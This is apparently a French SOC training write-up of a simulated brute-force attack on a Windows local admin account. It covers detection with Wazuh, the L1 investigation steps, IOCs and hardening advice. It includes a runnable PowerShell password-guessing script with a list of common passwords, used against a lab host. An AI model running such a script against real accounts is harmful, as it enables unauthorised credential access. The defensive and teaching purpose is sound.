# Cas SOC #1 : Détection de Bruteforce sur Compte Administrateur Local

## 📋 Résumé exécutif

**Type d'incident :** Tentative d'accès non autorisé par bruteforce  
**Sévérité :** 🔴 Critique (Level 10)  
**Statut :** Détecté par le SIEM  
**Vecteur d'attaque :** Bruteforce via PowerShell Remoting  
**Cible :** Compte administrateur local `hbw` 
**Résultat :** Échec de l'attaque (mot de passe non trouvé)

---

## 🎯 MITRE ATT&CK Framework

| Attribut | Valeur |
|----------|--------|
| **Technique** | T1110 - Brute Force |
| **Sous-technique** | T1110.001 - Password Guessing |
| **Tactique** | Credential Access |
| **Plateforme** | Windows |
| **Data Source** | Windows Event Logs (Security) |

**Description :** Attaquant tente de deviner le mot de passe d'un compte en essayant de multiples combinaisons jusqu'à obtenir l'accès.

---

## 📅 Timeline de l'incident

```
[2026-01-03 14:32:15] Début des tentatives d'authentification
[2026-01-03 14:32:17] Échec #1 - Mot de passe incorrect
[2026-01-03 14:32:19] Échec #2 - Mot de passe incorrect
[2026-01-03 14:32:21] Échec #3 - Mot de passe incorrect
[...]
[2026-01-03 14:33:01] Échec #15 - Mot de passe incorrect
[2026-01-03 14:33:03] ⚠️ ALERTE WAZUH - Multiple Logon Failures détectée
[2026-01-03 14:33:10] Fin des tentatives (dictionnaire épuisé)
```

**Durée totale de l'attaque :** 55 secondes  
**Fréquence moyenne :** 1 tentative toutes les 3-4 secondes  

**Note :** Le compte n'a pas été verrouillé car la politique de verrouillage Windows n'était pas configurée sur ce poste de test (common dans les environnements de lab).

---

## 🧪 Simulation de l'attaque

### Contexte
Simulation d'un attaquant ayant obtenu un accès initial à un poste du réseau et tentant d'élever ses privilèges ou de réutiliser les credentials du compte administrateur `hbw` pour du lateral movement via PowerShell Remoting.

### Script d'attaque utilisé

```powershell
# Script de simulation - Bruteforce sur compte local
# ⚠️ À usage éducatif uniquement dans environnement de test

# Liste de mots de passe à tester (dictionnaire simplifié)
$passwords = @(
    "Password123",
    "Admin2024",
    "Windows10!",
    "P@ssw0rd",
    "Administrateur123",
    "Admin!2024",
    "SecurePass1",
    "Winter2024!",
    "CompanyName123",
    "Password!",
    "Admin123456",
    "Welcome2024",
    "P@ssword123",
    "Test1234!",
    "AdminPassword"
)

$target = "WIN-AGENT-01"
$username = "hbw"

# Tentatives de connexion
$attempt = 0
foreach ($password in $passwords) {
    $attempt++
    Write-Host "[Attempt $attempt/15] Testing password: $password" -ForegroundColor Yellow
    
    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
        
        # Tentative de connexion PowerShell Remoting
        $result = Invoke-Command -ComputerName $target -Credential $credential -ScriptBlock {
            return $env:COMPUTERNAME
        } -ErrorAction Stop
        
        # Si on arrive ici, le mot de passe est correct
        Write-Host "[SUCCESS] Valid credentials found: $password" -ForegroundColor Green
        break
        
    } catch {
        Write-Host "[FAILED] Invalid credentials" -ForegroundColor Red
        Start-Sleep -Seconds 3  # Délai entre tentatives
    }
}
```

### Résultat de l'exécution

```
[Attempt 1/15] Testing password: Password123
[FAILED] Invalid credentials
[Attempt 2/15] Testing password: Admin2024
[FAILED] Invalid credentials
[Attempt 3/15] Testing password: Windows10!
[FAILED] Invalid credentials
[...]
[Attempt 15/15] Testing password: AdminPassword
[FAILED] Invalid credentials

All passwords exhausted. Attack unsuccessful.
```

---

## 🚨 Détection Wazuh

### Alerte générée

**Règle déclenchée :** `60204 - Multiple Windows Logon Failures`

```json
{
  "rule": {
    "id": "60204",
    "level": 10,
    "description": "Multiple Windows Logon Failures",
    "groups": ["authentication_failed", "windows"],
    "mitre": {
      "id": ["T1110"],
      "technique": ["Brute Force"],
      "tactic": ["Credential Access"]
    }
  },
  "agent": {
    "id": "001",
    "name": "WIN-AGENT-01",
    "ip": "192.168.3.130"
  },
  "data": {
    "win": {
      "eventdata": {
        "targetUserName": "hbw",
        "workstationName": "WIN-AGENT-01",
        "ipAddress": "127.0.0.1",
        "logonType": "3",
        "status": "0xC000006D",
        "subStatus": "0xC000006A",
        "failureReason": "Unknown user name or bad password"
      }
    }
  },
  "timestamp": "2026-01-03T14:33:03.245Z",
  "full_log": "2026 Jan 03 14:33:03 WinEvtLog: Security: AUDIT_FAILURE(4625): [...]"
}
```

**Champs clés de l'alerte :**

| Champ | Valeur | Signification |
|-------|--------|---------------|
| **Level** | 10 | Critique - Nécessite investigation immédiate |
| **targetUserName** | hbw | Compte ciblé (administrateur local)* |
| **logonType** | 3 | Network logon (PowerShell Remoting) |
| **status** | 0xC000006D | STATUS_LOGON_FAILURE |
| **subStatus** | 0xC000006A | Bad password |
| **ipAddress** | 127.0.0.1 | Source : localhost (attaque locale) |

*Dans votre environnement, ce sera le nom de votre compte administrateur Windows.

### Événements Windows corrélés

**Event ID 4625 - Logon Failure** (15 occurrences)

```
Security Log Events (extrait) :
14:32:17 - Event ID 4625 - Logon Type 3 - User: hbw - Status: 0xC000006A
14:32:19 - Event ID 4625 - Logon Type 3 - User: hbw - Status: 0xC000006A
14:32:21 - Event ID 4625 - Logon Type 3 - User: hbw - Status: 0xC000006A
[...]
14:33:01 - Event ID 4625 - Logon Type 3 - User: hbw - Status: 0xC000006A
```

**Volume total :** 15 événements 4625 en 55 secondes

**Observation :** Aucun Event ID 4740 (Account Lockout) généré car la politique de verrouillage de compte n'est pas configurée sur ce lab.

---

## 🔍 Investigation SOC L1

### Étape 1 : Qualification de l'alerte

✅ **Alerte confirmée comme vraie positive**

**Critères de validation :**
- ✅ Volume anormal : 15 tentatives en < 1 minute (seuil normal : 3-5/jour)
- ✅ Cible sensible : Compte Administrateur (privilégié)
- ✅ Pattern suspect : Intervalles réguliers (3-4 secondes)
- ✅ Échecs successifs : Aucune authentification réussie

### Étape 2 : Analyse de contexte

**Questions d'investigation :**

| Question | Réponse | Analyse |
|----------|---------|---------|
| Qui est l'attaquant ? | Source : 127.0.0.1 (localhost) | Attaque depuis la machine elle-même |
| Compte ciblé légitime ? | Oui, compte hbw (admin local) | Compte à haute valeur (privilégié) |
| Horaire suspect ? | 14:32 - Heures ouvrables | Pas d'anomalie horaire |
| Utilisateur légitime connecté ? | Oui, session active | Possibilité de compromission préalable |
| Autres alertes corrélées ? | Non | Incident isolé |

**Hypothèse initiale :** Attaquant ayant déjà compromis la session utilisateur (malware, accès physique) et tentant de réutiliser les credentials pour du lateral movement ou de la persistance via PowerShell Remoting.

### Étape 3 : Collecte d'IOCs (Indicators of Compromise)

**IOCs identifiés :**

```
Type: User Account
Value: hbw (compte administrateur local)
Context: Cible de l'attaque

Type: IP Address
Value: 127.0.0.1 (localhost)
Context: Source des tentatives

Type: Logon Type
Value: 3 (Network)
Context: PowerShell Remoting

Type: Attack Pattern
Value: 15 failed attempts in 55 seconds
Context: Bruteforce signature
```

### Étape 4 : Timeline enrichie

```
[T-00:00] Attaquant a déjà un accès initial au poste
[T+00:00] Début du bruteforce (dictionnaire de 15 mots de passe)
[T+00:48] 15 tentatives échouées
[T+00:48] Wazuh corrèle les événements et génère l'alerte Level 10
[T+00:55] Arrêt des tentatives (dictionnaire épuisé)
```

### Étape 5 : Requêtes d'investigation

**Recherche d'activité suspecte avant/après :**

```
Dashboard Wazuh > Discover > Requêtes DQL :

1. Tous les événements de cet agent dans la dernière heure :
   agent.id: "001" AND @timestamp >= "now-1h"

2. Authentifications réussies suspectes :
   rule.id: 60106 AND data.win.eventdata.targetUserName: "hbw"

3. Autres tentatives bruteforce :
   rule.id: 60204

4. Élévation de privilèges :
   rule.mitre.id: "T1548" OR rule.mitre.id: "T1134"
```

**Résultat :** Aucune autre activité malveillante détectée avant ou après l'incident.

---

## ✅ Réponse et recommandations

### Actions immédiates (en environnement production)

**Confinement :**
- 🔴 Isoler WIN-AGENT-01 du réseau (bloquer communication réseau)
- 🔴 Déconnecter toutes les sessions actives sur le compte hbw
- 🔴 Forcer la réinitialisation du mot de passe du compte hbw

**Éradication :**
- 🔴 Scanner WIN-AGENT-01 avec antivirus/EDR
- 🔴 Rechercher processus suspects en cours d'exécution
- 🔴 Analyser scheduled tasks et persistence mechanisms

**Récupération :**
- 🟡 Réinitialiser le compte compromis avec mot de passe fort (20+ caractères)
- 🟡 Réactiver le poste une fois assaini
- 🟡 Monitoring renforcé pendant 72h

### Recommandations long terme

**Durcissement Windows :**

1. **Activer la politique de verrouillage de compte**
   ```
   Politique locale > Configuration ordinateur > Paramètres Windows > 
   Paramètres de sécurité > Stratégies de compte > Stratégie de verrouillage
   
   - Seuil de verrouillage : 5 tentatives
   - Durée de verrouillage : 30 minutes
   - Réinitialisation après : 30 minutes
   ```

2. **Désactiver le compte Administrateur intégré (si activé)**
   ```powershell
   # Vérifier d'abord s'il est actif
   net user Administrator
   
   # Le désactiver si nécessaire
   net user Administrator /active:no
   ```

3. **Activer l'audit avancé des authentifications**
   ```
   Audit Policy > Logon/Logoff > Audit Logon : Success + Failure
   Audit Policy > Logon/Logoff > Audit Account Lockout : Success + Failure
   ```

**Amélioration détection SIEM :**

1. **Réduire le seuil d'alerte pour comptes privilégiés**
   - Règle actuelle : 5 échecs en 2 minutes
   - Recommandation : 3 échecs en 1 minute pour comptes admin

2. **Créer une règle de corrélation avancée**
   ```
   IF (Event 4625 x 3 within 60s) AND (TargetUser IN AdminAccounts) 
   THEN Alert Level 12 + Block IP + Notify SOC
   
   # AdminAccounts = Liste de comptes privilégiés à surveiller
   ```

3. **Active Response Wazuh**
   ```xml
   <active-response>
     <command>firewall-drop</command>
     <location>local</location>
     <rules_id>60204</rules_id>
     <timeout>3600</timeout>  <!-- Bloquer IP pendant 1h -->
   </active-response>
   ```

**Sensibilisation utilisateurs :**
- Formation contre phishing (vecteur d'accès initial probable)
- Politique de mots de passe forts (min 14 caractères, complexité)
- Authentification multi-facteurs (MFA) pour comptes admin

---

## 📊 Résultat et conclusion

### Bilan de l'incident

| Indicateur | Valeur |
|------------|--------|
| **Temps de détection (TTD)** | < 1 minute ⚡ |
| **Temps de qualification** | 5 minutes |
| **Temps total de réponse (TTR)** | 15 minutes (simulation) |
| **Impact** | ❌ Aucun (attaque échouée) |
| **Données compromises** | ❌ Aucune |
| **Systèmes affectés** | 1 (WIN-AGENT-01) |

### Leçons apprises

✅ **Points forts :**
- Détection rapide et efficace par Wazuh (< 1 minute)
- Corrélation automatique des 15 événements 4625
- Mapping MITRE ATT&CK correct (T1110)
- Alerte de niveau approprié (Level 10 - Critique)

⚠️ **Points d'amélioration :**
- Absence de verrouillage de compte (politique non configurée)
- Pas d'Active Response automatique
- Pas d'alerte temps réel (email/Slack)
- Session utilisateur potentiellement compromise (attaque depuis localhost)

### Scénario en environnement réel

**Si c'était une vraie attaque :**

1. **Accès initial probable :** Phishing, RDP exposé, vulnérabilité exploitée
2. **Objectif attaquant :** Élévation privilèges → Lateral movement → Data exfiltration
3. **Risque :** Compromission totale du poste + propagation ransomware
4. **Dommages potentiels :** Chiffrement données, vol credentials, persistance

**Grâce au SIEM Wazuh, l'attaque a été détectée avant que l'attaquant n'obtienne des privilèges élevés.**

---

## 📚 Références

- **MITRE ATT&CK :** [T1110 - Brute Force](https://attack.mitre.org/techniques/T1110/)
- **Microsoft :** [Event ID 4625 - Logon Failure](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- **Wazuh :** [Rule 60204 - Multiple Logon Failures](https://documentation.wazuh.com/current/user-manual/ruleset/rules/60204.html)
- **NIST :** [Incident Response Lifecycle](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)

---

**📅 Incident simulé le :** 3 janvier 2026  
**👤 Analyste :** Hector Broussalis  
**⏱️ Durée d'investigation :** 20 minutes  
**✅ Statut final :** Incident clos - Fausse attaque (simulation lab)

---

*Ce cas démontre la capacité de Wazuh à détecter rapidement des tentatives de bruteforce et la méthodologie d'investigation SOC L1 standard.*
